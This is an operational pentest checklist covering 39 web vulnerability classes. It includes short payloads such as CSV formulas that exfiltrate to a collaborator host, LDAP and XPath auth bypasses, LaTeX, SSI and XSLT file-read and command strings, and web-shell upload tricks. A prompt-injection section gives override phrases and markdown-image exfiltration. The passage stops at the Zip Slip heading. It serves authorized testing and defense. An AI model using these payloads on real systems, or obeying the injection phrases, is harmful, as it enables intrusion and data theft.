# Vulnerability checklists - part 2 (operational, 2025-2026)

> Continuation of `checklists.md`. The remaining 39 categories out of 64 (PayloadsAllTheThings). Same format: item = action, go top to bottom, mark `[x]`.
> Detailed research (impact, CVE, sources) is in `research-part2.md`.

**Contents:** [API Key Leaks](#1-api-key-leaks) · [Brute Force & Rate Limit](#2-brute-force--rate-limit) · [Clickjacking](#3-clickjacking) · [CSPT](#4-client-side-path-traversal-cspt) · [CRLF](#5-crlf-injection) · [CSS Injection](#6-css-injection) · [CSV Injection](#7-csv-injection-formula-injection) · [CVE Exploits](#8-cve-exploits) · [DNS Rebinding](#9-dns-rebinding) · [DOM Clobbering](#10-dom-clobbering) · [DoS](#11-denial-of-service) · [Dependency Confusion](#12-dependency-confusion) · [Encoding Transformations](#13-encoding-transformations) · [External Variable Modification](#14-external-variable-modification) · [GWT](#15-google-web-toolkit-gwt) · [HPP](#16-http-parameter-pollution-hpp) · [Headless Browser](#17-headless-browser) · [Hidden Parameters](#18-hidden-parameters) · [Insecure Management Interface](#19-insecure-management-interface) · [Insecure Randomness](#20-insecure-randomness) · [SCM Leaks (.git/.svn)](#21-insecure-source-code-management-gitsvn-leaks) · [Java RMI](#22-java-rmi) · [LDAP Injection](#23-ldap-injection) · [LaTeX Injection](#24-latex-injection) · [ORM Leak](#25-orm-leak) · [Prompt Injection (LLM)](#26-prompt-injection-llm) · [ReDoS](#27-regular-expression-redos) · [Reverse Proxy Misconfig](#28-reverse-proxy-misconfigurations) · [SAML Injection](#29-saml-injection) · [SSI/ESI](#30-ssi--esi-injection) · [Tabnabbing](#31-tabnabbing-reverse-tabnabbing) · [Type Juggling](#32-type-juggling) · [Upload Insecure Files](#33-upload-insecure-files) · [Virtual Hosts](#34-virtual-hosts-vhost-enumeration) · [WebSockets (CSWSH)](#35-web-sockets-cswsh) · [XPATH](#36-xpath-injection) · [XS-Leaks](#37-xs-leaks) · [XSLT](#38-xslt-injection) · [Zip Slip](#39-zip-slip)

---

## 1. API Key Leaks

**Recon / where to look**
- [ ] JS bundles (`grep` for `api_key`, `apikey`, `token`, `secret`, `AKIA`, `AIza`, `sk_live`, `xoxb`)
- [ ] Frontend source, sourcemaps (`.js.map`)
- [ ] Git history (`.git` exposed, public GitHub/GitLab repos, dorks `org:target filename:.env`)
- [ ] Mobile APK/IPA (decompile -> strings)
- [ ] Wayback Machine, public S3 buckets, Postman/Swagger collections
- [ ] HTTP responses, headers, error pages

**Detection / validation (mandatory before the report)**
- [ ] Determine the key type by prefix/format (`keyhacks`, `secretmagpie`)
- [ ] Check whether the key is valid and its scope (a minimal safe request, no abuse)
- [ ] Assess impact: what the key grants (billing, PII, sending mail/SMS, admin)

**Tools:** `trufflehog`, `gitleaks`, `keyhacks`, `gitdorks`, `nuclei` (exposure templates)
**Defense (for the report):** secret scanning in CI; rotation on leak; secret vault (not in code/frontend); scoped/short-lived keys

---

## 2. Brute Force & Rate Limit

**Recon / where to look**
- [ ] Points: login, OTP/2FA, password reset, promo codes, invites, PIN, API keys
- [ ] Understand the limit model: per-IP, per-account, per-session, global, or absent

**Detection / bypass**
- [ ] Is there a limit at all? Run 50+ attempts
- [ ] IP rotation: headers `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `True-Client-IP` (change each request)
- [ ] Counter reset: login case change, adding a dot/`%00`, different formats (`user`, `User`, `user `)
- [ ] Numeric OTP/PIN: single-packet race (see §15 part 1) to bypass the attempt limit
- [ ] Reset token short/numeric -> brute force
- [ ] Distributed brute force (if the limit is per-IP)

**Tools:** Burp Intruder, `ffuf`, Turbo Intruder (race), `hydra`
**Defense (for the report):** lockout/exponential backoff per account+IP; CAPTCHA after N attempts; long random tokens; notifications

---

## 3. Clickjacking

**Detection**
- [ ] Check for the absence of `X-Frame-Options` and `Content-Security-Policy: frame-ancestors`
- [ ] Try embedding the page in an `<iframe>` on your own domain -> does it render?

**Exploitation**
- [ ] Find a one-click sensitive action (settings change, deletion, confirmation, OAuth consent)
- [ ] Build a PoC: a transparent iframe (`opacity:0`) over a lure
- [ ] Multi-step / drag-and-drop variants if needed

**Tools:** Burp Clickbandit, manual HTML
**Defense (for the report):** `frame-ancestors 'none'` or `'self'`; `X-Frame-Options: DENY`; `SameSite` cookies
> Usually low severity - a sensitive one-click action is needed for impact.

---

## 4. Client Side Path Traversal (CSPT)

**Recon / where to look**
- [ ] Find client-side `fetch`/`axios`/XHR where part of the path comes from a URL parameter, hash, or stored value (`id`, `slug`, `note`)
- [ ] Load the CSPT Burp extension (Doyensec) -> Source Scope = client parameters, Sink Methods = GET/POST/PUT/DELETE

**Detection / exploitation**
- [ ] Inject `../` into the value -> does it normalize and redirect the fetch to another endpoint?
- [ ] Dot-segment variants: `../`, `..%2f`, `..;/`, `.././`, UTF-8 homoglyphs
- [ ] Suffixes for segment validity: `.json`, `.css`, `;` (matrix params)
- [ ] **CSPT2CSRF**: steer an authenticated POST/PUT/DELETE to a sensitive endpoint (password reset, payment approval, admin MFA deletion) - bypasses CSRF tokens (the front adds them itself)
- [ ] **CSPT2XSS**: steer to an endpoint whose response lands in a DOM sink
- [ ] Header-based auth (JWT in `Authorization`): the front itself attaches the token -> classic CSRF "comes alive"
- [ ] Gadget file via upload (JSON valid for `JSON.parse`) if the source is an uploaded file

**Tools:** Doyensec **CSPTBurpExtension**, **Gecko** (Vitor Falcao), **CSPTPlayground**
**Defense (for the report):** do not build paths from user input; validate/normalize before fetch; endpoint allowlist

---

## 5. CRLF Injection

**Recon / where to look**
- [ ] Parameters that land in HTTP response headers: redirect (`Location`), `Set-Cookie`, custom headers, logs

**Detection / exploitation**
- [ ] Inject `%0d%0a` -> does a new header appear in the response?
- [ ] Header injection: `%0d%0aSet-Cookie:%20sessid=attacker`
- [ ] HTTP response splitting -> XSS: `%0d%0a%0d%0a<script>alert(1)</script>`
- [ ] Open redirect / cache poisoning via injecting `Location`
- [ ] Log injection (forging records)

**Filter bypass**
- [ ] Variants: `%0d%0a`, `%0a`, `%0d`, `\r\n`, `%23%0d%0a`
- [ ] Unicode/overlong: `%E5%98%8A%E5%98%8D` (-> CR LF)
- [ ] nginx and a number of backends accept decoded `\r\n` in some sinks

**Tools:** Burp, `crlfuzz`, `nuclei`
**Defense (for the report):** strip CR/LF from input, do not reflect user input into headers

---

## 6. CSS Injection

**Recon / where to look**
- [ ] Points where input lands in `<style>` or the `style` attribute (theming, custom styles, email)

**Detection / exploitation**
- [ ] Confirm injection of a CSS rule
- [ ] Exfiltration via attribute selectors: `input[value^="a"]{background:url(//collab/a)}` -> character by character
- [ ] Theft of a CSRF token/secret from value/attributes
- [ ] Blind: `@import`, font ligatures, recursive `@import` for sequential exfiltration
- [ ] Possible chain -> account takeover (via token leak)

**Tools:** manual, Burp Collaborator
**Defense (for the report):** CSP; sanitize/escape input into styles; do not place secrets in DOM attributes

---

## 7. CSV Injection (Formula Injection)

**Recon / where to look**
- [ ] Fields that land in exported CSV/XLSX (name, comment, profile, any user text)

**Detection / exploitation**
- [ ] Inject a value starting with `=`, `+`, `-`, `@`, Tab(`0x09`), CR(`0x0D`)
- [ ] DDE RCE (Excel, on user confirmation): `=cmd|'/c calc'!A1`
- [ ] Exfiltration: `=HYPERLINK("//collab/?"&A1,"click")`, `=WEBSERVICE("//collab/?"&A1)`
- [ ] Download the export, open it in Excel/Sheets -> check that it triggers

**Tools:** manual
**Defense (for the report):** prefix dangerous leading characters with an apostrophe `'`; escape formula characters when generating the file

---

## 8. CVE Exploits

**Methodology (meta-category)**
- [ ] Fingerprint the product and the **exact version** (headers, favicon-hash, static files, `/CHANGELOG`, JS versions)
- [ ] CVE search: NVD, GitHub Security Advisories, Exploit-DB, `searchsploit`, CISA KEV
- [ ] Find a PoC (GitHub, packetstorm) -> read it, understand it, **verify it applies to the version**
- [ ] Run `nuclei` with templates relevant to the version/product
- [ ] Carefully confirm (without anything destructive), assess impact

**Tools:** `nuclei`, `searchsploit`, Metasploit, NVD/GHSA, Shodan
**Defense (for the report):** patch management, KEV monitoring, virtual patching/WAF as a temporary measure

---

## 9. DNS Rebinding

**Recon / where to look**
- [ ] Services that validate the host/IP **before** the request but resolve separately (SSRF filters, importers)
- [ ] Internal services and IoT without a `Host`-header check

**Detection / exploitation**
- [ ] Set up a domain with TTL=0 that alternates a public IP -> `127.0.0.1`/internal
- [ ] Pass validation on the public IP, then rebind to the internal one (TOCTOU)
- [ ] Target: internal APIs, cloud metadata, local services

**Tools:** **Singularity of Origin** (NCC), `rebind`, `whonow`
**Defense (for the report):** `Host` validation; DNS pinning; resolve and request in one step; egress filtering

---

## 10. DOM Clobbering

**Recon / where to look**
- [ ] HTML injection without `<script>` (the sanitizer strips scripts but lets `id`/`name` through)
- [ ] JS that reads `window.X`/`document.X`/globals without declaring them

**Detection / exploitation**
- [ ] Overwrite a global: `<a id=x href="javascript:...">`, `<a id=x name=y>`
- [ ] Nested: `<form id=x><input name=y></form>` -> `x.y`
- [ ] Collections via duplicate `id`
- [ ] Chain -> XSS or CSP bypass (overwriting `script.src`/config; see CVE-2025-1647 Bootstrap)

**Tools:** Burp **DOM Invader** (clobbering mode)
**Defense (for the report):** explicit variable declaration; namespacing; `Object.freeze`; a sanitizer that strips `id`/`name`; Trusted Types

---

## 11. Denial of Service

> Only within authorized scope. Many programs prohibit DoS - often they test "likelihood" without an actual crash.

**Recon / where to look**
- [ ] Points with unbounded processing: file upload, JSON/XML parsing, regex over input, search, report/image generation, GraphQL

**Detection (without a full crash)**
- [ ] Algorithmic complexity: ReDoS pattern (see §27), hash collision
- [ ] Decompression: zip/gzip bomb, XML billion laughs (entity expansion)
- [ ] Deeply nested JSON/XML; GraphQL depth/alias (see §19 part 1)
- [ ] Large payloads without a size limit; response time scaling with growing input (at graduated load, not to failure)

**Tools:** manual, `regexploit`
**Defense (for the report):** size/depth/timeout limits; complexity limiting; RE2; rate limiting; decompression with a limit

---

## 12. Dependency Confusion

**Recon / where to look**
- [ ] Extract internal package names: `package.json`, `requirements.txt`, lock files, error stacktraces, JS bundles, scope names (`@company/...`)
- [ ] Check which of them are **not registered** in the public npm/PyPI/registry

**Detection / exploitation (ethical, in scope)**
- [ ] Unregistered name + public registry + default resolution -> substitution possible
- [ ] Test via a canary package with a **higher** version and a safe beacon (OAST/DNS only, no malicious payload) - strictly within the program
- [ ] Account for install-time (postinstall/setup.py) vs runtime triggers

**Tools:** `confused`, `snync`, Socket.dev, OWASP DependencyTrack
**Defense (for the report):** namespace ownership (claim names publicly as stubs); a single private index/scoped registry; pin versions; cooldown for new packages
> 2025 context: Shai-Hulud 2.0, GhostAction (3325 secrets), the chalk/debug compromise - supply chain is in the crosshairs.

---

## 13. Encoding Transformations

> Not a vulnerability but a universal bypass toolkit for all the other classes.

**Application**
- [ ] URL / double-URL encoding (`%2e`, `%252e`)
- [ ] Unicode normalization NFKC (character -> ASCII after normalization on the backend)
- [ ] Overlong UTF-8, fullwidth characters (`／`, `＜`)
- [ ] HTML entities (`&lt;`, `&#x3c;`, `&#60;`)
- [ ] Base64 / hex / mixed-case
- [ ] Combine layers for a specific parser (the front decodes differently than the back)

**Tools:** **Hackvertor** (Burp), CyberChef, `ffuf` with encoders
**Defense (for the report):** canonicalize before validation; uniform decoding behavior across the whole chain

---

## 14. External Variable Modification

**Recon / where to look**
- [ ] PHP applications with `extract($_REQUEST/$_GET/$_POST)`, `import_request_variables`, `$$var`, register_globals style

**Detection / exploitation**
- [ ] Submit a parameter named like an internal variable (`?authenticated=1`, `?isAdmin=1`, `?user_id=...`)
- [ ] Overwrite the variable before the check -> auth bypass / logic flaw
- [ ] Overwrite include paths/configs

**Tools:** manual, source analysis
**Defense (for the report):** do not apply `extract()`/dynamic variables to user input; explicit assignment

---

## 15. Google Web Toolkit (GWT)

**Recon / where to look**
- [ ] GWT signs: `*.nocache.js`, `*.cache.html`, GWT-RPC endpoints, `X-GWT-Permutation`
- [ ] Find the RPC services and serialization policy (`.gwt.rpc`)

**Detection / exploitation**
- [ ] Parse the GWT-RPC payload, enumerate methods/services
- [ ] Find hidden/undocumented methods and parameters
- [ ] Swap types/values in the RPC request (logic, IDOR, injections into the underlying calls)

**Tools:** **GWTMap**, GWT-Penetration-Testing helpers, Burp
**Defense (for the report):** server-side authorization on each RPC method; validation; do not rely on method "obscurity"

---

## 16. HTTP Parameter Pollution (HPP)

**Recon / where to look**
- [ ] Any parameters (GET/POST), especially those passing through a proxy/WAF to the backend

**Detection / exploitation**
- [ ] Duplicate a parameter: `?id=1&id=2` -> which one is taken (first/last/array/concatenation)?
- [ ] WAF bypass: a malicious value in the second occurrence if the WAF checks the first
- [ ] Logic/auth bypass via a parsing discrepancy front<->back
- [ ] Client-side HPP: injecting `&`/`%26` into a value that lands in a generated URL/link

**Tools:** Burp, `nuclei`
**Defense (for the report):** uniform parameter parsing; explicit validation; reject duplicates where appropriate

---

## 17. Headless Browser

> Attack on server-side rendering (PDF/screenshot/preview via puppeteer/Chromium).

**Recon / where to look**
- [ ] Functions: HTML->PDF, screenshot generation, link/URL preview, template rendering

**Detection / exploitation**
- [ ] Inject HTML/JS into the rendered content -> XSS in the renderer's context
- [ ] Local file read: `<iframe src="file:///etc/passwd">`, `<script>fetch('file:///...')`
- [ ] SSRF: `<img src="http://169.254.169.254/...">`, `<iframe src="http://internal/">`
- [ ] Leak via rendering into the resulting PDF/screenshot

**Tools:** manual, Burp Collaborator, see §3/§4 part 1 (SSRF/SSTI)
**Defense (for the report):** do NOT use `--no-sandbox`; renderer isolation; block `file://`/internal; timeouts; forbid external resources

---

## 18. Hidden Parameters

**Recon / where to look**
- [ ] JS bundles (parameter names), Swagger/OpenAPI, GraphQL introspection, error messages
- [ ] Wordlists of hidden parameters

**Detection / exploitation**
- [ ] Brute-force parameters: `Arjun`, `param-miner`, `x8`
- [ ] Check the effect: `debug=true`, `admin=1`, `test=1`, `source=true`, `is_admin`
- [ ] Chain -> Mass Assignment (§22 part 1), privilege escalation, debug disclosure, ORM Leak (§25)

**Tools:** `Arjun`, Burp **Param Miner**, `x8`
**Defense (for the report):** allowlist of accepted parameters; disable debug in prod; server-side authorization

---

## 19. Insecure Management Interface

**Recon / where to look**
- [ ] Path fuzzing: `/admin`, `/manager/html`, `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/jolokia`, `/console`, `/phpmyadmin`, `/.well-known/`, Kibana/Grafana/Jenkins
- [ ] Shodan/Censys by product and port; non-standard ports

**Detection / exploitation**
- [ ] Access without authorization?
- [ ] Default creds (`admin:admin`, vendor defaults)
- [ ] Spring Boot Actuator: `/env`, `/heapdump` (secrets), `/mappings`, `/gateway` -> RCE chains
- [ ] Tomcat Manager / Jolokia (MBean) -> deploy/RCE

**Tools:** `nuclei`, `ffuf`, `feroxbuster`, Shodan
**Defense (for the report):** restrict by IP/VPN/auth; disable sensitive actuator endpoints; change defaults

---

## 20. Insecure Randomness

**Recon / where to look**
- [ ] Tokens: session, password reset, OTP, CSRF, API keys, invite codes

**Detection / exploitation**
- [ ] Collect many tokens -> analyze for sequence/low entropy
- [ ] Signs of a weak PRNG: time-seeded, `Math.random()`, `mt_rand()`, increment, predictability
- [ ] If predictable -> predict the victim's reset/session token

**Tools:** entropy analysis (`burp sequencer`), manual
**Defense (for the report):** CSPRNG (`secrets`, `crypto.randomBytes`, `SecureRandom`); sufficient length; not time-based

---

## 21. Insecure Source Code Management (.git/.svn leaks)

**Recon / where to look**
- [ ] Check: `/.git/HEAD`, `/.git/config`, `/.svn/entries`, `/.hg/`, `/.bzr/`, `/.DS_Store`, `/.gitignore`

**Detection / exploitation**
- [ ] `/.git/HEAD` returns `ref: refs/heads/...` -> the repository is accessible
- [ ] Dump: `git-dumper`, `GitTools` (Dumper/Extractor), `dvcs-ripper`
- [ ] Extract source, secrets, commit history (deleted keys)
- [ ] `.DS_Store` -> `ds_store_exp` for directory listing

**Tools:** `git-dumper`, `GitTools`, `dvcs-ripper`, `nuclei` (exposures), `ds_store_exp`
**Defense (for the report):** block access to dot-files/directories on the web server; do not deploy VCS directories; CI without `.git` in the artifact

---

## 22. Java RMI

**Recon / where to look**
- [ ] RMI registry ports (1099 and others), JMX (usually 1099/9010/random)
- [ ] Identify the service (`nmap -sV`, `--script rmi-dumpregistry`)

**Detection / exploitation**
- [ ] Enumerate bound objects in the registry
- [ ] Deserialization via RMI (passing a gadget object)
- [ ] JMX: MLet -> load a remote MBean -> RCE; default/no-auth JMX
- [ ] Remote method guessing/abuse

**Tools:** **remote-method-guesser (rmg)**, **BaRMIe**, `ysoserial`, `nmap` rmi-scripts
**Defense (for the report):** do not expose RMI/JMX externally; JMX auth+TLS; deserialization filters; updates

---

## 23. LDAP Injection

**Recon / where to look**
- [ ] Points that go to LDAP: login, user/group search, address book

**Detection / exploitation**
- [ ] Special characters `(`, `)`, `*`, `\`, `|`, `&` -> error/change
- [ ] Auth bypass: `*)(uid=*))(|(uid=*`, `admin)(&)`, `*)(|(password=*))`
- [ ] Wildcard enumeration: `*`
- [ ] Blind boolean: character by character via `(attr=a*)` and observing the result

**Tools:** manual, `ldapsearch`, scripts
**Defense (for the report):** escape LDAP metacharacters; parameterize filters; validate input

---

## 24. LaTeX Injection

**Recon / where to look**
- [ ] LaTeX compilation points (PDF generators, scientific/report services, math rendering)

**Detection / exploitation**
- [ ] File read: `\input{/etc/passwd}`, `\include{...}`, `\lstinputlisting{/etc/passwd}`, `\verbatiminput{...}`
- [ ] RCE (if shell-escape is enabled): `\immediate\write18{id}`, `\write18{cat /etc/passwd}`
- [ ] File writing: `\newwrite\out \openout\out=...`
- [ ] Check access to the resulting PDF (the read output)

**Tools:** manual
**Defense (for the report):** disable `--shell-escape`; sandbox compilation (container/restricted); command allowlist; timeout

---

## 25. ORM Leak

**Recon / where to look**
- [ ] Search/filter endpoints that accept field names/operators from the request
- [ ] Patterns: Django `filter(**request.data)`, `Q(**params)`; Prisma `where: req.query.filter`; Beego; Ransack (Ruby)

**Detection / exploitation**
- [ ] Django field lookups: `?password__startswith=a`, `?email__contains=admin`, `?token__regex=^abc`
- [ ] JSONField: `?profile__secret_key__startswith=sk_`, `?settings__has_key=api_key`
- [ ] Boolean oracle character by character (result present/absent) -> automate a binary search
- [ ] Relational filtering: pivot via one-to-one / many-to-many to sensitive fields of related tables
- [ ] Error-based via a ReDoS predicate on MySQL (when response length is not an oracle)
- [ ] Account for the DB collation when picking the character order
- [ ] **CVE-2025-64459 (Django)**: `_connector`/`_negated` in `Q(**params)` -> full SQLi (CVSS 9.1)

**Tools:** **plormber** (time-based ORM Leak), elttam **semgrep-rules** (Django/Prisma/Beego/EF), manual Python script
**Defense (for the report):** allowlist of queryable fields (never allow filtering by password/token); server-controlled query logic; do not expand a user dict into an ORM call

---

## 26. Prompt Injection (LLM)

**Recon / where to look**
- [ ] AI features in scope: chatbots, RAG, agents with tool-calls, summarizers, document/email/site processing
- [ ] External-content points that the model reads (indirect): web pages, files, email, names/descriptions

**Detection / exploitation**
- [ ] Direct: instruction override ("ignore previous instructions", role change)
- [ ] System prompt extraction ("repeat your instructions verbatim")
- [ ] **Indirect**: hide instructions in external content (page/PDF/resume) that will land in context via RAG/tool-call - white/tiny font, HTML comments
- [ ] Tool/function abuse: make the agent call a dangerous tool (sending data, actions)
- [ ] Data exfiltration via a markdown image/link to your domain with data in the URL
- [ ] Guardrail bypass: base64/emoji/multilingual encoding of instructions, character injection (LLMSEC 2025)

**Tools:** Arcanum Prompt Injection Taxonomy, garak, PromptFoo, manual
**Defense (for the report):** separate data/instructions (spotlighting); least-privilege for tool-calls + human-in-the-loop; output channel filtering (no auto-fetch); sanitize external content; defense-in-depth (OWASP LLM01:2025, NIST AI RMF)

---

## 27. Regular Expression (ReDoS)

**Recon / where to look**
- [ ] Fields matched by a server-side regex: email/URL/phone validation, search, parsing; user regex

**Detection / exploitation**
- [ ] Find a vulnerable pattern: nested quantifiers `(a+)+`, `(.*)*`, overlapping alternatives `(a|a)*`, `(a|ab)*`
- [ ] Payload: a long near-match string + a breaking character at the end (`"aaaa...aaaa!"`)
- [ ] Measure the growth in response time (catastrophic backtracking)

**Tools:** **regexploit**, `recheck`, `redos-detector`
**Defense (for the report):** RE2 (linear complexity); atomic groups/possessive; match timeout; input length limit; avoid nested quantifiers

---

## 28. Reverse Proxy Misconfigurations

**Recon / where to look**
- [ ] Identify the pairing (CDN/proxy + origin): nginx, Apache, HAProxy, Envoy + backend
- [ ] Find endpoints protected at the proxy level (auth/ACL) but proxied to the backend

**Detection / exploitation**
- [ ] **nginx alias traversal** (no trailing slash in `location`): `/assets../`, `/images../config.php` -> `ffuf -u http://t/assets../FUZZ`
- [ ] location-matching: `location /admin` (without `/`) is bypassed by `/admin/` or vice versa; adding a byte (`\x85`, `%85`) breaks `location = /admin`
- [ ] **Path confusion** front<->back (PAN-OS CVE-2025-0108): normalization discrepancy -> auth bypass (`X-pan-AuthCheck`), internal redirect -> execution of a hidden script
- [ ] Header smuggling: inject/overwrite `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host` if the proxy does not clean them
- [ ] CRLF in unsafe nginx variables (`$uri`/`$arg_`)
- [ ] `merge_slashes off` nuances; `proxy_pass` without a slash -> traversal to the backend (`/api../`)

**Tools:** **bypass-url-parser** (laluka), **Kyubi** (alias traversal), `ffuf`, see §19 part 1 (smuggling)
**Defense (for the report):** trailing slash in `location`/`alias`; uniform normalization front<->back; clean hop-by-hop and `X-*` headers; IP whitelisting for management

---

## 29. SAML Injection

**Recon / where to look**
- [ ] SAML SSO flow (SP-/IdP-initiated); intercept the `SAMLResponse` (Base64, often URL-encoded/deflate)
- [ ] Identify the SP library (ruby-saml, php-saml, samlify, python3-saml, xmlseclibs)

**Detection / exploitation**
- [ ] **XML Signature Wrapping (XSW)**: add a malicious unsigned assertion next to the signed one; try positions (SAML Raider - 8 XSW techniques)
- [ ] **Parser differential** (ruby-saml ReXML vs Nokogiri): a payload that the check sees differently than the app logic (CVE-2025-25291/25292/66567/66568; samlify CVE-2025-47949)
- [ ] **Comment injection** in NameID: `admin<!---->@evil.com` -> the text after the comment is lost during canonicalization (old, but check it)
- [ ] **Golden SAML / empty-string signature reuse** (PortSwigger "Fragile Lock", libxml2 canonicalization): an empty-string signature -> valid on an arbitrary Response
- [ ] `alg`/certificate confusion; no check of `Recipient`/`Audience`/`NotOnOrAfter`; XXE in SAML (see §9 part 1)
- [ ] Swap NameID/attributes to `admin`

**Tools:** Burp **SAML Raider**, `samling`, manual XML
**Defense (for the report):** a single XML parser; schema hardening + `disallow-doctype`; sign the whole assertion and verify references; check Audience/Recipient/time; update the library (ruby-saml >=1.18.0)

---

## 30. SSI / ESI Injection

**Recon / where to look**
- [ ] SSI: `.shtml`/`.stm`, Apache `mod_include`, reflection points in HTML
- [ ] ESI: presence of an edge cache/CDN (Varnish, Akamai, Fastly, Squid); header `Surrogate-Control`

**Detection / exploitation**
- [ ] SSI: `<!--#echo var="DATE_LOCAL"-->`, `<!--#include virtual="/etc/passwd"-->`, `<!--#exec cmd="id"-->`
- [ ] ESI: `<esi:include src="http://collab/"/>` (SSRF), `<esi:include src="..."/>` for XSS/include, `<esi:debug/>`
- [ ] ESI -> HttpOnly/XSS bypass if the engine executes injected ESI from user input

**Tools:** manual, Burp Collaborator
**Defense (for the report):** do not process SSI/ESI from user input; disable `exec`; escaping; restrict `esi:include` to trusted sources

---

## 31. Tabnabbing (Reverse Tabnabbing)

**Recon / where to look**
- [ ] External links/windows with `target="_blank"` **without** `rel="noopener noreferrer"`
- [ ] Points where the user sets a URL opened in a new tab (reviews, profiles, chats)

**Detection / exploitation**
- [ ] The opened page gets `window.opener` -> it can rewrite `window.opener.location` to phishing
- [ ] PoC: a controlled page that does `window.opener.location = 'https://phish/'`

**Tools:** manual HTML
**Defense (for the report):** `rel="noopener noreferrer"` on all `_blank`; modern browsers default to `noopener`, but do not rely on it for old ones
> Usually low severity (a phishing vector).

---

## 32. Type Juggling

**Recon / where to look**
- [ ] Comparison points that accept typed input (JSON API): login, token check, hash comparison
- [ ] PHP with `==` instead of `===`, `strcmp`, `in_array` without strict

**Detection / exploitation**
- [ ] Magic hashes: values with a hash of the form `0e\d+` -> `"0e123" == "0e456"` is true (both are "0")
- [ ] JSON typed bypass: `{"password": true}`, `{"password": 0}`, `{"hmac": 0}` against a string comparison
- [ ] `strcmp(array, "str")` -> NULL -> `NULL == 0` is true (auth bypass)
- [ ] `in_array($x, $arr)` without strict
- [ ] Account for PHP 8: `0 == "abc"` is now **false** (previously true) - `0=="string"` bypasses do not work, but magic-hash (`0e`) and array tricks remain

**Tools:** magic-hash lists, manual
**Defense (for the report):** strict comparison `===`/`hash_equals()`; type checks before comparison; do not compare secrets via `==`

---

## 33. Upload Insecure Files

**Recon / where to look**
- [ ] Find upload endpoints (avatar, document, import); understand where files are stored and whether they are accessible by URL

**Detection / bypass (combine)**
- [ ] Direct shell upload per backend: `.php`/`.phtml`/`.php5`/`.pht`/`.phar` (PHP), `.jsp`/`.jspx`, `.asp`/`.aspx`
- [ ] Double extension: `shell.php.jpg`, `shell.jpg.php`
- [ ] Content-Type spoof: `Content-Type: image/png` on a PHP file
- [ ] Magic bytes: prefix `GIF89a;` / a valid image header + code
- [ ] Null byte (old): `shell.php%00.jpg`
- [ ] Case/special characters: `.pHp`, `shell.php.`, `shell.php;.jpg`, trailing space/dots
- [ ] **.htaccess override** (Apache): upload `.htaccess` with `AddType application/x-httpd-php .jpg`
- [ ] Polyglot / **PHP in a PNG IDAT chunk** (survives resize via `imagecopyresized`)
- [ ] ImageMagick (if it processes): `push graphic-context ... fill 'url(...|cmd)'` (ImageTragick CVE family)
- [ ] Path traversal in the file name -> write outside the directory (see Zip Slip §39)
- [ ] Check execution: `uploads/shell.php?cmd=id`

**Tools:** Burp, `nuclei` (upload-bypass templates), exiftool (injection into metadata)
**Defense (for the report):** extension allowlist + magic-bytes + re-encoding; random names; store outside the webroot; disable script execution in the upload dir; CDN with forced download

---

## 34. Virtual Hosts (vhost enumeration)

**Recon / where to look**
- [ ] Get the target IP; understand that several vhosts may be hosted on it
- [ ] Name sources: subdomain wordlists, found subdomains, corp naming (`dev`, `staging`, `internal`, `admin`, `jira`)

**Detection / exploitation**
- [ ] Fuzz the `Host` header on a single IP: `ffuf -u http://IP/ -H "Host: FUZZ.target.com" -fs <baseline>`
- [ ] `gobuster vhost`, `VHostScan` - filter by response size/code/headers
- [ ] Find internal/staging/admin vhosts absent from public DNS -> access to hidden applications

**Tools:** `ffuf`, `gobuster vhost`, `VHostScan`
**Defense (for the report):** the default vhost returns 404/403; do not host internal on a public IP without network restriction

---

## 35. Web Sockets (CSWSH)

**Recon / where to look**
- [ ] Find WebSocket connections (`ws://`/`wss://`, the upgrade request in Burp); understand what is transmitted
- [ ] Check the handshake: is there a CSRF token, is `Origin` checked

**Detection / exploitation**
- [ ] **CSWSH**: the handshake relies only on cookies, `Origin` is not checked -> from your domain `new WebSocket('wss://target/...')` with the victim's cookies, read/send messages
- [ ] PoC page: open ws, `onmessage` -> exfiltrate data to your server
- [ ] Message tampering: injections into message data (XSS/SQLi/etc. in the WS channel)
- [ ] No auth at the message level (access to other people's data)

**Tools:** Burp (WebSocket history/Repeater), `ws-harness`, manual JS
**Defense (for the report):** validate `Origin` on the handshake; CSRF token in the upgrade request; authentication and authorization at the message level; do not trust WS input

---

## 36. XPATH Injection

**Recon / where to look**
- [ ] Points that go to an XML/XPath query (login against an XML store, search in XML)

**Detection / exploitation**
- [ ] Special characters `'`, `"`, `(`, `)` -> error/change
- [ ] Auth bypass: `' or '1'='1`, `') or ('1'='1`, `' or 1=1 or ''='`
- [ ] Blind boolean character by character: `substring(//user[1]/password,1,1)='a'`, `string-length(...)`
- [ ] Structure enumeration: `count(//user)`, `name(//*[1])`

**Tools:** **xcat**, manual
**Defense (for the report):** parameterized XPath / precompiled with variables; escaping; input validation

---

## 37. XS-Leaks

**Recon / where to look**
- [ ] Cross-origin endpoints that respond differently depending on the user's state (logged-in, whether there is a search result, whether they are the owner)
- [ ] Ability to embed the target in an `<iframe>` / open it via `window.open`

**Detection / exploitation**
- [ ] **Frame counting**: `win = window.open(target); win.length` -> the number of frames reveals state (results exist / logged in)
- [ ] **Timing**: measure `performance.now()` around loading a cross-origin resource (cache vs no-cache, user exists)
- [ ] **Error events**: `img.onload`/`onerror`, `<script>`/`<link>` onerror -> resource existence/state
- [ ] **CSP redirect detection**: a CSP on your page allowing only a specific URL -> block = there was a redirect (logged-in?)
- [ ] **postMessage** broadcast - intercept unintentionally broadcast messages
- [ ] **CSS injection XS-Leak** (2025) / focus events to probe an ID

**Tools:** manual JS, XS-Leaks Wiki PoC
**Defense (for the report):** `Cross-Origin-Opener-Policy: same-origin`; `Cross-Origin-Resource-Policy`; **Fetch Metadata** (`Sec-Fetch-*`); uniform responses (uniform 404, size padding, stable redirects); `SameSite` cookies

---

## 38. XSLT Injection

**Recon / where to look**
- [ ] XSLT transformation points (XML->HTML/PDF/document) where input lands in the stylesheet or the input XML

**Detection / exploitation**
- [ ] Version/engine: `<xsl:value-of select="system-property('xsl:version')"/>`, `'vendor'`, `'product-version'`
- [ ] File read: `<xsl:value-of select="unparsed-text('/etc/passwd')"/>`, `document('/etc/passwd')`
- [ ] SSRF: `document('http://collab/')`, `document('http://169.254.169.254/...')`
- [ ] RCE via extension functions: PHP `php:function('system','id')`, Java/.NET extensions (if enabled)

**Tools:** manual
**Defense (for the report):** disable extension functions and `document()`/external; sandbox processor; validation; update libxslt/Saxon

---

## 39. Zip Slip

**Recon / where to look**
- [ ] Unpacking functions for uploaded archives (ZIP/TAR/JAR/RAR): import, backup-restore, plugins, themes

**Detection / exploitation**
